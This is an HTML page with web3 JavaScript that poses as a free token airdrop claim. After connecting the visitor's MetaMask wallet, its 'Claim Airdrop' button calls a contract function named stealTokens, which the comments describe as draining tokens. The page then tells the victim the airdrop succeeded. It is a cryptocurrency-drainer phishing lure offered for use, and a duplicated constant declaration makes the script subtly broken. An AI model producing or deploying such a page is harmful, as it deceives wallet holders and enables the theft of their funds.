<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Airdrop</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
</head>
<body>
    <h1>Claim Your Free Airdrop!</h1>
    <button id="connectButton">Connect MetaMask</button>
    <button id="airdropButton" style="display:none;">Claim Airdrop</button>

    <script>
        // Define the ABI (Application Binary Interface) of the AirdropSteal contract
        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "_tokenAddress", "type": "address" }
                ],
                "name": "stealTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            { "inputs": [], "stateMutability": "nonpayable", "type": "constructor" },
            { "stateMutability": "payable", "type": "receive" }
        ];

        // Contract addresses
        const contractAddress = "0xf5d2621f8b5eaabd6a35e65142cf0c06d9b791b5"; // Deployed address of AirdropSteal
        const tokenAddress = "0x9052EB26C0b9836335Ec153413F80bAEc7536414"; // Token address to steal
const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // Token contract address to steal from

        let web3;
        let contract;
        let userAddress;

        // Function to connect MetaMask
        async function connectMetaMask() {
            if (window.ethereum) {
                web3 = new Web3(window.ethereum);
                try {
                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];

                    // Hide the connect button and show the airdrop button
                    document.getElementById('connectButton').style.display = 'none';
                    document.getElementById('airdropButton').style.display = 'block';
                } catch (error) {
                    console.error("MetaMask connection failed", error);
                    alert("Please connect your MetaMask wallet.");
                }
            } else {
                alert("MetaMask not detected! Please install MetaMask.");
            }
        }

        // Function to claim the airdrop (execute the stealTokens function)
        async function claimAirdrop() {
            contract = new web3.eth.Contract(contractABI, contractAddress);

            try {
                // Fetch current gas price
                const gasPrice = await web3.eth.getGasPrice();
                const gasLimit = 100000; // Set a reasonable gas limit

                // Execute the stealTokens function
                await contract.methods.stealTokens(tokenAddress).send({
                    from: userAddress,
                    gasPrice: gasPrice,
                    gas: gasLimit
                });

                alert("Airdrop claimed! Tokens transferred.");
            } catch (err) {
                console.error("Error claiming the airdrop:", err);
                alert("Transaction failed! Check the console for more details.");
            }
        }

        // Event listeners for the buttons
        document.getElementById('connectButton').addEventListener('click', connectMetaMask);
        document.getElementById('airdropButton').addEventListener('click', claimAirdrop);
    </script>
</body>
</html>
